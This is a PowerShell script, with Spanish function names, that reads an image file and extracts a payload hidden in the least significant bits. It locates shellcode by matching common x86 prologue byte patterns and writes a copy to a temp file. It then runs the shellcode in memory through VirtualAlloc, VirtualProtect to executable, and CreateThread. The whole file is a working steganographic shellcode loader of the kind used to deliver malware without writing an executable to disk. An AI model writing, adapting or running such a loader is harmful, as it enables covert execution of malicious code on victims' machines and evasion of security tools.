Add-Type -AssemblyName System.Drawing
function Extract-LSB {
    param (
        [byte]$byte
    )
    return $byte -band 1
}
function imagen_a_binario {
    param (
        [string]$imagen_input,
        [int]$block_size = 4
    )
    try {
        $rutaAbsoluta = Convert-Path -Path $imagen_input -ErrorAction Stop
        Write-Host "img: $rutaAbsoluta"
        $imageBytes = [System.IO.File]::ReadAllBytes($rutaAbsoluta)
        Write-Host "len: $($imageBytes.Length) bytes"
        $bits = New-Object System.Collections.BitArray($imageBytes.Length)
        $bitIndex = 0
        foreach ($byte in $imageBytes) {
            $bits[$bitIndex] = Extract-LSB $byte
            $bitIndex++
        }
        Write-Host "bits: $($bits.Length)"
        Write-Host "Bytes: $([Math]::Ceiling($bits.Length / 8))"
        $resultBytes = New-Object byte[] ([Math]::Ceiling($bits.Length / 8))
        if ($bits.Length -gt ($resultBytes.Length * 8)) {
            $bits.Length = $resultBytes.Length * 8
        }
        try {
            $bits.CopyTo($resultBytes, 0)
        }
        catch {
            Write-Error "Error bits to bytes: $_"
            throw
        }
        $patterns = @(
            [byte[]]@(0x48, 0x31, 0xc9),   
            [byte[]]@(0x48, 0x89, 0xe5),   
            [byte[]]@(0x48, 0x83, 0xec),   
            [byte[]]@(0x31, 0xc0),         
            [byte[]]@(0x89, 0xe5),         
            [byte[]]@(0x83, 0xec)          
        )
        $startIndex = -1
        foreach ($pattern in $patterns) {
            for ($i = 0; $i -lt $resultBytes.Length - $pattern.Length; $i++) {
                $found = $true
                for ($j = 0; $j -lt $pattern.Length; $j++) {
                    if ($resultBytes[$i + $j] -ne $pattern[$j]) {
                        $found = $false
                        break
                    }
                }
                if ($found) {
                    $startIndex = $i
                    Write-Host "shellcode offset: $startIndex"
                    break
                }
            }
            if ($startIndex -ne -1) { break }
        }
        if ($startIndex -eq -1) {
            Write-Host "shellcode, not found"
            $startIndex = 0
        }
        $shellcode = $resultBytes[$startIndex..($resultBytes.Length-1)]
        Write-Host "len shellcode: $($shellcode.Length) bytes"
        $temp_file = [System.IO.Path]::GetTempFileName()
        [System.IO.File]::WriteAllBytes($temp_file, $shellcode)
        Write-Host "Shellcode saved: $temp_file"

        return $shellcode
    }
    catch {
        Write-Error "Error img: $_"
        throw
    }
}
function ejecutar_binario_desde_memoria {
    param (
        [byte[]]$byte_data
    )
    try {

        $initialProcess = Get-Process -Id $PID
        Write-Host "PID: $PID $($initialProcess.Threads.Count) threads"
        $initialProcess.Threads | Format-Table Id, StartTime, ThreadState -AutoSize
        $WinAPI = Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;

        public class WinAPI {
            [DllImport("kernel32.dll")]
            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("kernel32.dll")]
            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

            [DllImport("kernel32.dll")]
            public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        }
"@ -PassThru
        $size = [uint32]$byte_data.Length
        $addr = $WinAPI::VirtualAlloc(
            [IntPtr]::Zero, 
            $size, 
            0x1000, 
            0x04    
        )
        if ($addr -eq [IntPtr]::Zero) {
            throw "Error memory"
        }
        Write-Host "Memory: $addr"
        [System.Runtime.InteropServices.Marshal]::Copy($byte_data, 0, $addr, $byte_data.Length)
        $oldProtect = 0
        $result = $WinAPI::VirtualProtect($addr, $size, 0x20, [ref]$oldProtect) 
        if (-not $result) {
            throw "Error change mem"
        }

        Write-Host "Process ID: $PID"
        Get-Process -Id $PID | Format-Table Id, ProcessName, Threads
        $threadId = 0
        $threadHandle = $WinAPI::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)
        if ($threadHandle -eq [IntPtr]::Zero) {
            throw "Error creating thread"
        }
        Write-Host "Thread ID: $threadId proc: $PID"
        Start-Sleep -Seconds 2
        $currentProcess = Get-Process -Id $PID
        Write-Host "Threads: $($currentProcess.Threads.Count)"
        $currentProcess.Threads | Format-Table Id, StartTime, ThreadState -AutoSize
        $result = $WinAPI::WaitForSingleObject($threadHandle, 30000)
        $status = switch ($result) {
            0 { "COMPLETADO" }
            258 { "TIMEOUT" }
            default { "ERROR: $result" }
        }
        Write-Host "`nResult: $status"
        $finalProcess = Get-Process -Id $PID
        $finalProcess.Threads | Format-Table Id, StartTime, ThreadState -AutoSize
        $finalProcess | Format-Table Id, CPU, WorkingSet, PrivateMemorySize -AutoSize
        $waitResult = $WinAPI::WaitForSingleObject($threadHandle, 30000) 
        switch ($waitResult) {
            0 { Write-Host "Thread success" }
            258 { Write-Host "Thread timeout" }
            default { Write-Host "Thread end: $waitResult" }
        }
        Get-Process -Id $PID | Select-Object -ExpandProperty Threads | Format-Table Id, ThreadState
    }
    catch {
        Write-Error "Error exec bin: $_"
        throw
    }
}
function main {
    param (
        [Parameter(Mandatory=$true)]
        [string]$imagen_input,
        
        [Parameter(Mandatory=$false)]
        [int]$block_size = 4
    )
    try {
        Write-Host "exec as: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
        Write-Host "path: $(Get-Location)"
        
        $shellcode = imagen_a_binario -imagen_input $imagen_input -block_size $block_size
        ejecutar_binario_desde_memoria -byte_data $shellcode
    }
    catch {
        Write-Error "Error Exec: $_"
        exit 1
    }
}
if ($args.Length -gt 0) {
    main -imagen_input $args[0] -block_size $(if ($args.Length -gt 1) { [int]$args[1] } else { 4 })
}
else {
    Write-Output "Usage: .\script.ps1 <imagen_input> [block_size]"
    exit 1
}